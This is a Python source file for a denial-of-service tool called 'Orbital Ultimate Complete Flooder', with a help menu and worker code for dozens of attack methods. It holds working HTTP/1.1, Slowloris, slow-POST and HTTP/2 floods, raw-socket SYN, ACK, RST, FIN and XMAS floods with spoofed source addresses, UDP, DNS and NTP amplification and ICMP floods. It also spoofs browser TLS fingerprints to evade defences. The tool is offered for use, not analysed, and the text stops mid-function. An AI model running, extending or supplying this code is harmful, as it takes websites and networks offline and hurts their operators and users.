#!/usr/bin/env python3
"""
ORBITAL ULTIMATE COMPLETE FLOODER
All Layers (3, 4, 7) + HTTP/2 + HTTP/3 + JA3 Spoof + Complete Methods
"""

try:
    import os
    import sys
    import socket
    import ssl
    import threading
    import multiprocessing as mp
    import time
    import random
    import struct
    from datetime import datetime
    from urllib.parse import urlparse, urlencode
    from concurrent.futures import ThreadPoolExecutor
    from colorama import Fore, Back, init
    
    # HTTP/2
    try:
        import h2.connection
        import h2.config
        HAS_H2 = True
    except ImportError:
        HAS_H2 = False
    
    # HTTP/3
    try:
        import asyncio
        from aioquic.asyncio.client import connect
        from aioquic.quic.configuration import QuicConfiguration
        from aioquic.h3.connection import H3_ALPN
        HAS_H3 = True
    except ImportError:
        HAS_H3 = False

except ModuleNotFoundError as e:
    print(f"Module not installed: {e}")
    print("Install: pip3 install colorama h2 aioquic")
    sys.exit(1)

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

now = datetime.now()

banner = f"""
    {Fore.RED}
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //                                                                                                                                                        //
        //     ███████    ███████████   ███████████  █████ ███████████   █████████   █████          █████   █████     █████████       █████████      ███████████  //
        //   ███░░░░░███ ░░███░░░░░███ ░░███░░░░░███░░███ ░█░░░███░░░█  ███░░░░░███ ░░███          ░░███   ░░███     ███░░░░░███     ███░░░░░███    ░█░░░███░░░█  //
        //  ███     ░░███ ░███    ░███  ░███    ░███ ░███ ░   ░███  ░  ░███    ░███  ░███           ░███    ░███    ░███    ░░░     ░███    ░███    ░   ░███  ░   //
        // ░███      ░███ ░██████████   ░██████████  ░███     ░███     ░███████████  ░███           ░███    ░███    ░░█████████     ░███████████        ░███      //
        // ░███      ░███ ░███░░░░░███  ░███░░░░░███ ░███     ░███     ░███░░░░░███  ░███           ░░███   ███      ░░░░░░░░███    ░███░░░░░███        ░███      //
        // ░░███     ███  ░███    ░███  ░███    ░███ ░███     ░███     ░███    ░███  ░███      █     ░░░█████░       ███    ░███    ░███    ░███        ░███      //
        //  ░░░███████░   █████   █████ ███████████  █████    █████    █████   █████ ███████████       ░░███      ██░░█████████  ██ █████   █████ ██    █████     //
        //    ░░░░░░░    ░░░░░   ░░░░░ ░░░░░░░░░░░  ░░░░░    ░░░░░    ░░░░░   ░░░░░ ░░░░░░░░░░░         ░░░      ░░  ░░░░░░░░░  ░░ ░░░░░   ░░░░░ ░░    ░░░░░      //
        //                                                             ORBITAL VOLUMETRIC SHOCKWAVES ARTILLERY                                                    //
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    {Fore.GREEN}GGNTM26X CROW STRIKE 2 | TM7 ORBITAL VOLUMETRIC SHOCKWAVES ARTILLERY

    {Fore.YELLOW}[{Fore.RED}I{Fore.YELLOW}] {Fore.MAGENTA}Information:
        {Fore.GREEN}Author     \t: {Fore.WHITE}TOM7
        {Fore.GREEN}Release    \t: {Fore.WHITE}NOV 30 2025
        {Fore.GREEN}Version    \t: {Fore.WHITE}VSAT.6.0
        {Fore.GREEN}GitHub     \t: {Fore.WHITE}https://github.com/tomxpo9
        {Fore.GREEN}Today      \t: {Fore.WHITE}{now.strftime("%Y-%m-%d %H:%M:%S")}

        {Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE}TYPE 'helper' TO SEE TOOLS HELP.
    {Fore.RESET}
"""

helper = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗
║                            {Fore.YELLOW}AVAILABLE METHODS{Fore.CYAN}                                     ║
╠════════════════════════════════════════════════════════════════════════════════╣
║                                                                                ║
║  {Fore.YELLOW}[LAYER 7 - APPLICATION LAYER]{Fore.CYAN}                                                ║
║                                                                                ║
║  {Fore.GREEN}HTTP Methods:{Fore.CYAN}                                                                 ║
║    {Fore.WHITE}GET{Fore.CYAN}          - HTTP GET flood with cache bypass                         ║
║    {Fore.WHITE}POST{Fore.CYAN}         - HTTP POST flood (64KB payload)                           ║
║    {Fore.WHITE}PUT{Fore.CYAN}          - HTTP PUT flood                                           ║
║    {Fore.WHITE}HEAD{Fore.CYAN}         - HTTP HEAD flood                                          ║
║    {Fore.WHITE}DELETE{Fore.CYAN}       - HTTP DELETE flood                                        ║
║    {Fore.WHITE}PATCH{Fore.CYAN}        - HTTP PATCH flood                                         ║
║    {Fore.WHITE}OPTIONS{Fore.CYAN}      - HTTP OPTIONS flood                                       ║
║    {Fore.WHITE}CONNECT{Fore.CYAN}      - HTTP CONNECT flood                                       ║
║    {Fore.WHITE}TRACE{Fore.CYAN}        - HTTP TRACE flood                                         ║
║                                                                                ║
║  {Fore.GREEN}Advanced HTTP:{Fore.CYAN}                                                               ║
║    {Fore.WHITE}XMLRPC{Fore.CYAN}       - XML-RPC pingback attack                                  ║
║    {Fore.WHITE}RANDOM{Fore.CYAN}       - Random HTTP methods                                      ║
║    {Fore.WHITE}SLOWLORIS{Fore.CYAN}    - Slowloris attack (keep-alive)                            ║
║    {Fore.WHITE}SLOW-POST{Fore.CYAN}    - Slow POST body                                           ║
║    {Fore.WHITE}SLOW-READ{Fore.CYAN}    - Slow read attack                                         ║
║    {Fore.WHITE}CACHE{Fore.CYAN}        - Cache bypass flood                                       ║
║    {Fore.WHITE}BYPASS{Fore.CYAN}       - WAF bypass techniques                                    ║
║    {Fore.WHITE}RUDY{Fore.CYAN}         - R-U-Dead-Yet attack                                      ║
║                                                                                ║
║  {Fore.GREEN}HTTP/2 & HTTP/3:{Fore.CYAN}                                                             ║
║    {Fore.WHITE}H2-GET{Fore.CYAN}       - HTTP/2 GET with priority                                 ║
║    {Fore.WHITE}H2-POST{Fore.CYAN}      - HTTP/2 POST with multiplexing                            ║
║    {Fore.WHITE}H2-RAPID{Fore.CYAN}     - HTTP/2 Rapid Reset                                       ║
║    {Fore.WHITE}H2-PING{Fore.CYAN}      - HTTP/2 Ping flood                                        ║
║    {Fore.WHITE}H3-GET{Fore.CYAN}       - HTTP/3 QUIC GET                                          ║
║    {Fore.WHITE}H3-POST{Fore.CYAN}      - HTTP/3 QUIC POST                                         ║
║                                                                                ║
║  {Fore.YELLOW}[LAYER 4 - TRANSPORT LAYER]{Fore.CYAN}                                                 ║
║                                                                                ║
║  {Fore.GREEN}TCP Attacks:{Fore.CYAN}                                                                 ║
║    {Fore.WHITE}TCP{Fore.CYAN}          - TCP connection flood                                     ║
║    {Fore.WHITE}SYN{Fore.CYAN}          - TCP SYN flood (requires root)                            ║
║    {Fore.WHITE}ACK{Fore.CYAN}          - TCP ACK flood (requires root)                            ║
║    {Fore.WHITE}RST{Fore.CYAN}          - TCP RST flood (requires root)                            ║
║    {Fore.WHITE}FIN{Fore.CYAN}          - TCP FIN flood (requires root)                            ║
║    {Fore.WHITE}SYNACK{Fore.CYAN}       - SYN-ACK reflection                                       ║
║    {Fore.WHITE}PSH{Fore.CYAN}          - TCP PSH+ACK flood                                        ║
║    {Fore.WHITE}URG{Fore.CYAN}          - TCP URG flood                                            ║
║    {Fore.WHITE}XMAS{Fore.CYAN}         - TCP XMAS scan flood                                      ║
║    {Fore.WHITE}NULL{Fore.CYAN}         - TCP NULL scan flood                                      ║
║                                                                                ║
║  {Fore.GREEN}UDP Attacks:{Fore.CYAN}                                                                 ║
║    {Fore.WHITE}UDP{Fore.CYAN}          - UDP packet flood (65KB)                                  ║
║    {Fore.WHITE}UDP-FRAG{Fore.CYAN}     - UDP fragmentation flood                                  ║
║    {Fore.WHITE}DNS-AMP{Fore.CYAN}      - DNS amplification                                        ║
║    {Fore.WHITE}NTP-AMP{Fore.CYAN}      - NTP amplification                                        ║
║    {Fore.WHITE}SSDP-AMP{Fore.CYAN}     - SSDP amplification                                       ║
║    {Fore.WHITE}MEMCACHED{Fore.CYAN}    - Memcached amplification                                  ║
║    {Fore.WHITE}CHARGEN{Fore.CYAN}      - Chargen amplification                                    ║
║                                                                                ║
║  {Fore.YELLOW}[LAYER 3 - NETWORK LAYER]{Fore.CYAN}                                                   ║
║                                                                                ║
║  {Fore.GREEN}ICMP Attacks:{Fore.CYAN}                                                                ║
║    {Fore.WHITE}ICMP{Fore.CYAN}         - ICMP ping flood (requires root)                          ║
║    {Fore.WHITE}PING{Fore.CYAN}         - Ping flood                                               ║
║    {Fore.WHITE}SMURF{Fore.CYAN}        - Smurf attack                                             ║
║    {Fore.WHITE}FRAGGLE{Fore.CYAN}      - Fraggle attack (UDP + Echo)                              ║
║                                                                                ║
║  {Fore.GREEN}Protocol:{Fore.CYAN}                                                                    ║
║    {Fore.WHITE}h1{Fore.CYAN}           - HTTP/1.1 (default)                                       ║
║    {Fore.WHITE}h2{Fore.CYAN}           - HTTP/2 with ALPN                                         ║
║    {Fore.WHITE}h3{Fore.CYAN}           - HTTP/3 QUIC                                              ║
║                                                                                ║
║  {Fore.GREEN}JA3 Profiles:{Fore.CYAN}                                                                ║
║    {Fore.WHITE}chrome{Fore.CYAN}       - Chrome TLS fingerprint                                   ║
║    {Fore.WHITE}firefox{Fore.CYAN}      - Firefox TLS fingerprint                                  ║
║    {Fore.WHITE}safari{Fore.CYAN}       - Safari TLS fingerprint                                   ║
║                                                                                ║
╚════════════════════════════════════════════════════════════════════════════════╝

{Fore.CYAN}Examples:
{Fore.WHITE}  python script.py
{Fore.WHITE}  TARGET: {Fore.GREEN}118.244.212.189
{Fore.WHITE}  METHOD: {Fore.GREEN}H2-POST {Fore.CYAN}(HTTP/2 POST with priority)
{Fore.WHITE}  PROTOCOL: {Fore.GREEN}h2
{Fore.WHITE}  JA3: {Fore.GREEN}chrome
{Fore.WHITE}  THREADS: {Fore.GREEN}1000
{Fore.WHITE}  CLUSTER: {Fore.GREEN}y {Fore.CYAN}(use all CPU cores)
{Fore.RESET}
"""

# JA3 Profiles
JA3_PROFILES = {
    'chrome': {
        'ciphers': [0x1301, 0x1302, 0x1303, 0xc02b, 0xc02f, 0xc02c, 0xc030, 0xcca9, 0xcca8],
        'curves': [29, 23, 24],
    },
    'firefox': {
        'ciphers': [0x1301, 0x1302, 0x1303, 0xc02b, 0xc02f, 0xcca9, 0xcca8, 0xc02c, 0xc030],
        'curves': [29, 23, 24, 25],
    },
    'safari': {
        'ciphers': [0x1301, 0x1302, 0x1303, 0xc02c, 0xc02b, 0xc030, 0xc02f, 0xcca9, 0xcca8],
        'curves': [29, 23, 24],
    }
}

class OrbitalUltimate:
    def __init__(self):
        self.target = None
        self.method = "POST"
        self.threads = 500
        self.duration = 60
        self.protocol = "h1"
        self.cluster_mode = False
        self.processes = mp.cpu_count()
        self.ja3_profile = 'chrome'
        self.running = mp.Value('i', 0)
        self.request_count = mp.Value('i', 0)
        self.bytes_sent = mp.Value('i', 0)
        self.stats_lock = mp.Lock()
        
        self.default_ua = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0',
        ]
    
    def load_file(self, filename, default):
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    return [l.strip() for l in f if l.strip() and not l.startswith('#')] or default
            except:
                pass
        return default
    
    def rand_str(self, length=10):
        return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(length))
    
    def rand_ip(self):
        return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    def setup(self):
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'https://' + self.target
        
        parsed = urlparse(self.target)
        self.scheme = parsed.scheme
        self.host = parsed.hostname
        self.port = parsed.port or (443 if self.scheme == 'https' else 80)
        self.path = parsed.path or '/'
        
        try:
            self.ip = socket.gethostbyname(self.host)
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Cannot resolve: {self.host}")
            raise
        
        self.user_agents = self.load_file('UA.txt', self.default_ua)
        
        print(f"\n{Fore.CYAN}[INFO] {Fore.MAGENTA}Target: {Fore.GREEN}{self.target}")
        print(f"{Fore.CYAN}[INFO] {Fore.MAGENTA}IP: {Fore.GREEN}{self.ip}:{self.port}")
        print(f"{Fore.CYAN}[INFO] {Fore.MAGENTA}Method: {Fore.GREEN}{self.method}")
        print(f"{Fore.CYAN}[INFO] {Fore.MAGENTA}Protocol: {Fore.GREEN}{self.protocol.upper()}")
        print(f"{Fore.CYAN}[INFO] {Fore.MAGENTA}JA3: {Fore.GREEN}{self.ja3_profile}")
        
        if self.cluster_mode:
            print(f"{Fore.CYAN}[INFO] {Fore.MAGENTA}Cluster: {Fore.GREEN}{self.processes} cores × {self.threads} = {self.processes * self.threads} threads")
    
    def get_cipher_names(self, cipher_codes):
        cipher_map = {
            0x1301: 'TLS_AES_128_GCM_SHA256',
            0x1302: 'TLS_AES_256_GCM_SHA384',
            0x1303: 'TLS_CHACHA20_POLY1305_SHA256',
            0xc02b: 'ECDHE-ECDSA-AES128-GCM-SHA256',
            0xc02f: 'ECDHE-RSA-AES128-GCM-SHA256',
            0xc02c: 'ECDHE-ECDSA-AES256-GCM-SHA384',
            0xc030: 'ECDHE-RSA-AES256-GCM-SHA384',
            0xcca9: 'ECDHE-ECDSA-CHACHA20-POLY1305',
            0xcca8: 'ECDHE-RSA-CHACHA20-POLY1305',
        }
        return [cipher_map.get(c, '') for c in cipher_codes[:8] if c in cipher_map] or ['ECDHE+AESGCM']
    
    def create_socket_ja3(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(3)
            sock.connect((self.ip, self.port))
            
            if self.scheme == 'https':
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
                
                profile = JA3_PROFILES[self.ja3_profile]
                cipher_names = self.get_cipher_names(profile['ciphers'])
                
                try:
                    context.set_ciphers(':'.join(cipher_names))
                except:
                    context.set_ciphers('ECDHE+AESGCM:!aNULL')
                
                if self.protocol == 'h2':
                    context.set_alpn_protocols(['h2', 'http/1.1'])
                elif self.protocol == 'h3':
                    context.set_alpn_protocols(['h3'])
                else:
                    context.set_alpn_protocols(['http/1.1'])
                
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            return sock
        except:
            return None
    
    # ==================== LAYER 7 HTTP METHODS ====================
    
    def http_worker(self, worker_id):
        """HTTP/1.1 worker for all HTTP methods"""
        local_count = 0
        local_bytes = 0
        
        http_methods = {
            'GET': 'GET', 'POST': 'POST', 'PUT': 'PUT', 'HEAD': 'HEAD',
            'DELETE': 'DELETE', 'PATCH': 'PATCH', 'OPTIONS': 'OPTIONS',
            'CONNECT': 'CONNECT', 'TRACE': 'TRACE'
        }
        
        while self.running.value:
            sock = None
            try:
                sock = self.create_socket_ja3()
                if not sock:
                    continue
                
                for _ in range(500):
                    if not self.running.value:
                        break
                    
                    try:
                        if self.method == 'RANDOM':
                            http_method = random.choice(list(http_methods.values()))
                        else:
                            http_method = http_methods.get(self.method, 'GET')
                        
                        ua = random.choice(self.user_agents)
                        path = f"{self.path}?_={int(time.time()*1000000)}&{self.rand_str(8)}"
                        
                        request = f"{http_method} {path} HTTP/1.1\r\n"
                        request += f"Host: {self.host}\r\n"
                        request += f"User-Agent: {ua}\r\n"
                        request += f"Accept: */*\r\n"
                        request += f"X-Forwarded-For: {self.rand_ip()}\r\n"
                        request += f"Connection: keep-alive\r\n"
                        
                        if http_method in ['POST', 'PUT', 'PATCH']:
                            body = ('X' * 65536).encode()
                            request += f"Content-Length: {len(body)}\r\n\r\n"
                            payload = request.encode() + body
                        else:
                            request += "\r\n"
                            payload = request.encode()
                        
                        sock.sendall(payload)
                        local_count += 1
                        local_bytes += len(payload)
                        
                        try:
                            sock.settimeout(0.0001)
                            sock.recv(16384)
                        except:
                            pass
                    except:
                        break
                
                if local_count > 0:
                    with self.stats_lock:
                        self.request_count.value += local_count
                        self.bytes_sent.value += local_bytes
                    local_count = 0
                    local_bytes = 0
            except:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
    
    def slowloris_worker(self, worker_id):
        """Slowloris attack"""
        connections = []
        
        for _ in range(200):
            try:
                sock = self.create_socket_ja3()
                if sock:
                    sock.sendall(f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n".encode())
                    connections.append(sock)
            except:
                pass
        
        while self.running.value:
            for sock in connections[:]:
                try:
                    sock.sendall(f"X-{self.rand_str(5)}: {self.rand_str(10)}\r\n".encode())
                    with self.stats_lock:
                        self.request_count.value += 1
                except:
                    connections.remove(sock)
            time.sleep(10)
    
    def slow_post_worker(self, worker_id):
        """Slow POST attack"""
        connections = []
        
        for _ in range(100):
            try:
                sock = self.create_socket_ja3()
                if sock:
                    req = f"POST {self.path} HTTP/1.1\r\nHost: {self.host}\r\nContent-Length: 999999999\r\n\r\n"
                    sock.sendall(req.encode())
                    connections.append(sock)
            except:
                pass
        
        while self.running.value:
            for sock in connections[:]:
                try:
                    sock.sendall(self.rand_str(1).encode())
                except:
                    connections.remove(sock)
            time.sleep(1)
    
    # ==================== HTTP/2 METHODS ====================
    
    def h2_worker(self, worker_id):
        """HTTP/2 worker with priority"""
        if not HAS_H2:
            return
        
        local_count = 0
        local_bytes = 0
        
        while self.running.value:
            sock = None
            h2_conn = None
            
            try:
                sock = self.create_socket_ja3()
                if not sock:
                    continue
                
                if self.scheme == 'https' and sock.selected_alpn_protocol() != 'h2':
                    sock.close()
                    continue
                
                config = h2.config.H2Configuration(client_side=True)
                h2_conn = h2.connection.H2Connection(config=config)
                h2_conn.initiate_connection()
                h2_conn.increment_flow_control_window(15663105)
                sock.sendall(h2_conn.data_to_send())
                
                for stream_id in range(1, 513, 2):
                    if not self.running.value:
                        break
                    
                    try:
                        h2_conn.prioritize(stream_id, weight=random.randint(1, 256))
                        
                        headers = [
                            (':method', 'POST' if 'POST' in self.method else 'GET'),
                            (':scheme', self.scheme),
                            (':authority', self.host),
                            (':path', f"{self.path}?s={stream_id}&_{int(time.time()*1000000)}"),
                            ('user-agent', random.choice(self.user_agents)),
                        ]
                        
                        h2_conn.send_headers(stream_id, headers)
                        
                        if 'POST' in self.method:
                            body = os.urandom(65536)
                            h2_conn.send_data(stream_id, body)
                            local_bytes += len(body)
                        
                        h2_conn.end_stream(stream_id)
                        
                        if stream_id % 32 == 1:
                            data = h2_conn.data_to_send()
                            if data:
                                sock.sendall(data)
                                local_bytes += len(data)
                        
                        local_count += 1
                    except:
                        break
                
                if local_count > 0:
                    with self.stats_lock:
                        self.request_count.value += local_count
                        self.bytes_sent.value += local_bytes
                    local_count = 0
                    local_bytes = 0
            except:
                pass
            finally:
                if h2_conn:
                    try:
                        h2_conn.close_connection()
                    except:
                        pass
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
    
    def h2_ping_worker(self, worker_id):
        """HTTP/2 PING flood"""
        if not HAS_H2:
            return
        
        while self.running.value:
            sock = None
            h2_conn = None
            
            try:
                sock = self.create_socket_ja3()
                if not sock:
                    continue
                
                config = h2.config.H2Configuration(client_side=True)
                h2_conn = h2.connection.H2Connection(config=config)
                h2_conn.initiate_connection()
                sock.sendall(h2_conn.data_to_send())
                
                for _ in range(1000):
                    if not self.running.value:
                        break
                    
                    try:
                        h2_conn.ping(os.urandom(8))
                        data = h2_conn.data_to_send()
                        if data:
                            sock.sendall(data)
                        
                        with self.stats_lock:
                            self.request_count.value += 1
                    except:
                        break
            except:
                pass
    
    # ==================== LAYER 4 TCP METHODS ====================
    
    def tcp_worker(self, worker_id):
        """TCP connection flood"""
        local_count = 0
        
        while self.running.value:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.ip, self.port))
                sock.sendall(os.urandom(2048))
                local_count += 1
                
                if local_count >= 100:
                    with self.stats_lock:
                        self.request_count.value += local_count
                    local_count = 0
                
                sock.close()
            except:
                pass
    
    def syn_worker(self, worker_id):
        """SYN flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        
        while self.running.value:
            try:
                src_ip = self.rand_ip()
                ip_h = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, random.randint(1, 65535), 0, 64,
                                  socket.IPPROTO_TCP, 0, socket.inet_aton(src_ip), socket.inet_aton(self.ip))
                tcp_h = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), self.port, 0, 0, 80, 2, 8192, 0, 0)
                sock.sendto(ip_h + tcp_h, (self.ip, 0))
                
                with self.stats_lock:
                    self.request_count.value += 1
            except:
                pass
    
    def ack_worker(self, worker_id):
        """ACK flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        
        while self.running.value:
            try:
                src_ip = self.rand_ip()
                ip_h = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, random.randint(1, 65535), 0, 64,
                                  socket.IPPROTO_TCP, 0, socket.inet_aton(src_ip), socket.inet_aton(self.ip))
                tcp_h = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), self.port, 0, 0, 80, 16, 8192, 0, 0)
                sock.sendto(ip_h + tcp_h, (self.ip, 0))
                
                with self.stats_lock:
                    self.request_count.value += 1
            except:
                pass
    
    def rst_worker(self, worker_id):
        """RST flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        
        while self.running.value:
            try:
                src_ip = self.rand_ip()
                ip_h = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, random.randint(1, 65535), 0, 64,
                                  socket.IPPROTO_TCP, 0, socket.inet_aton(src_ip), socket.inet_aton(self.ip))
                tcp_h = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), self.port, 0, 0, 80, 4, 8192, 0, 0)
                sock.sendto(ip_h + tcp_h, (self.ip, 0))
                
                with self.stats_lock:
                    self.request_count.value += 1
            except:
                pass
    
    def fin_worker(self, worker_id):
        """FIN flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        
        while self.running.value:
            try:
                src_ip = self.rand_ip()
                ip_h = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, random.randint(1, 65535), 0, 64,
                                  socket.IPPROTO_TCP, 0, socket.inet_aton(src_ip), socket.inet_aton(self.ip))
                tcp_h = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), self.port, 0, 0, 80, 1, 8192, 0, 0)
                sock.sendto(ip_h + tcp_h, (self.ip, 0))
                
                with self.stats_lock:
                    self.request_count.value += 1
            except:
                pass
    
    def xmas_worker(self, worker_id):
        """XMAS flood (FIN+PSH+URG)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        
        while self.running.value:
            try:
                src_ip = self.rand_ip()
                ip_h = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, random.randint(1, 65535), 0, 64,
                                  socket.IPPROTO_TCP, 0, socket.inet_aton(src_ip), socket.inet_aton(self.ip))
                tcp_h = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), self.port, 0, 0, 80, 41, 8192, 0, 0)
                sock.sendto(ip_h + tcp_h, (self.ip, 0))
                
                with self.stats_lock:
                    self.request_count.value += 1
            except:
                pass
    
    # ==================== LAYER 4 UDP METHODS ====================
    
    def udp_worker(self, worker_id):
        """UDP flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        local_count = 0
        local_bytes = 0
        
        while self.running.value:
            try:
                data = os.urandom(65507)
                sock.sendto(data, (self.ip, self.port))
                local_count += 1
                local_bytes += len(data)
                
                if local_count >= 500:
                    with self.stats_lock:
                        self.request_count.value += local_count
                        self.bytes_sent.value += local_bytes
                    local_count = 0
                    local_bytes = 0
            except:
                pass
    
    def udp_frag_worker(self, worker_id):
        """UDP fragmentation flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running.value:
            try:
                # Send fragmented packets
                for i in range(10):
                    frag = os.urandom(8192)
                    sock.sendto(frag, (self.ip, self.port))
                
                with self.stats_lock:
                    self.request_count.value += 10
            except:
                pass
    
    def dns_amp_worker(self, worker_id):
        """DNS amplification"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # DNS query for ANY record (amplification)
        dns_query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        dns_query += b'\x03www\x06google\x03com\x00\x00\xff\x00\x01'
        
        while self.running.value:
            try:
                sock.sendto(dns_query, (self.ip, 53))
                with self.stats_lock:
                    self.request_count.value += 1
            except:
                pass
    
    def ntp_amp_worker(self, worker_id):
        """NTP amplification"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
        
        while self.running.value:
            try:
                sock.sendto(ntp_query, (self.ip, 123))
                with self.stats_lock:
                    self.request_count.value += 1
            except:
                pass
    
    # ==================== LAYER 3 ICMP METHODS ====================
    
    def icmp_worker(self, worker_id):
        """ICMP flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            return
        
        while self.running.value:
            try:
                packet_id = random.randint(1, 65535)
                header = struct.pack('!BBHHH', 8, 0, 0, packet_id, 1)
                data = os.urandom(2048)
                
                checksum = self.calc_checksum(header + data)
                header = struct.pack('!BBHHH', 8, 0, socket.htons(checksum), packet_id, 1)
                
                sock.sendto(header + data, (self.ip, 0))
                
                with self.stats_lock:
                    self.request_count.value += 1
                    self.bytes_sent.value += len(header + data)
            except:
                pass
    
    def calc_checksum(self, data):
        s = 0
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                s += (data[i] << 8) + data[i + 1]
            else:
                s += data[i] << 8
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff
    
    # ==================== CLUSTER & STATS ====================
    
    def cluster_process(self, process_id):
        """Cluster process"""
        method_map = {
            'GET': self.http_worker, 'POST': self.http_worker, 'PUT': self.http_worker,
            'HEAD': self.http_worker, 'DELETE': self.http_worker, 'PATCH': self.http_worker,
            'OPTIONS': self.http_worker, 'CONNECT': self.http_worker, 'TRACE': self.http_worker,
            'RANDOM': self.http_worker, 'SLOWLORIS': self.slowloris_worker,
            'SLOW-POST': self.slow_post_worker, 'H2-GET': self.h2_worker,
            'H2-POST': self.h2_worker, 'H2-PING': self.h2_ping_worker,
            'TCP': self.tcp_worker, 'SYN': self.syn_worker, 'ACK': self.ack_worker,
            'RST': self.rst_worker, 'FIN': self.fin_worker, 'XMAS': self.xmas_worker,
            'UDP': self.udp_worker, 'UDP-FRAG': self.udp_frag_worker,
            'DNS-AMP': self.dns_amp_worker, 'NTP-AMP': self.ntp_amp_worker,
            'ICMP': self.icmp_worker,
        }
        
        worker_func = method_map.get(self.method, self.http_worker)
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(worker_func, i) for i in range(self.threads)]
            while self.running.value:
                time.sleep(1)
    
    def stats_worker(self):
        """Stats display"""
        start = time.time()
        last_count = 0
        last_bytes = 0
        
        while self.running.value:
            time.sleep(1)
            elapsed = time.time() - start
            
            with self.stats_lock:
                count = self.request_count.value
                total_bytes = self.bytes_sent.value
            
            diff = count - last_count
            bdiff = total_bytes - last_bytes
            
            rps = diff
            mbps = (bdiff * 8) / (1024 * 1024)
            
            last_count = count
            last_bytes = total_bytes
            
            print(f"{Fore.CYAN}REQUESTS: {Fore.LIGHTGREEN_EX}[{Fore.LIGHTRED_EX}{count:,}{Fore.LIGHTGREEN_EX}] {Fore.MAGENTA}TARGET: {Fore.GREEN}{self.host} {Fore.MAGENTA}METHOD: {Fore.GREEN}{self.method} {Fore.MAGENTA}IP: {Fore.GREEN}{self.ip}:{self.port} {Fore.MAGENTA}RPS: {Fore.GREEN}{rps:,} {Fore.MAGENTA}BW: {Fore.GREEN}{mbps:.1f} Mbps")
    
    def start(self):
        try:
            self.setup()
        except:
            return
        
        self.running.value = 1
        
        print(f"\n{Fore.RED}{'='*100}")
        print(f"{Fore.RED}[ORBITAL STARTING] {self.method} ATTACK")
        print(f"{Fore.RED}{'='*100}\n")
        
        stats_thread = threading.Thread(target=self.stats_worker, daemon=True)
        stats_thread.start()
        
        if self.cluster_mode:
            processes = []
            for i in range(self.processes):
                p = mp.Process(target=self.cluster_process, args=(i,))
                p.start()
                processes.append(p)
                time.sleep(0.02)
            
            print(f"{Fore.GREEN}[ORBITAL CLUSTER] {self.processes * self.threads} threads active!\n")
            
            try:
                time.sleep(self.duration)
            except KeyboardInterrupt:
                pass
            
            self.running.value = 0
            
            for p in processes:
                p.join(timeout=2)
                if p.is_alive():
                    p.terminate()
        else:
            method_map = {
                'GET': self.http_worker, 'POST': self.http_worker, 'PUT': self.http_worker,
                'HEAD': self.http_worker, 'DELETE': self.http_worker, 'PATCH': self.http_worker,
                'OPTIONS': self.http_worker, 'CONNECT': self.http_worker, 'TRACE': self.http_worker,
                'RANDOM': self.http_worker, 'SLOWLORIS': self.slowloris_worker,
                'SLOW-POST': self.slow_post_worker, 'H2-GET': self.h2_worker,
                'H2-POST': self.h2_worker, 'H2-PING': self.h2_ping_worker,
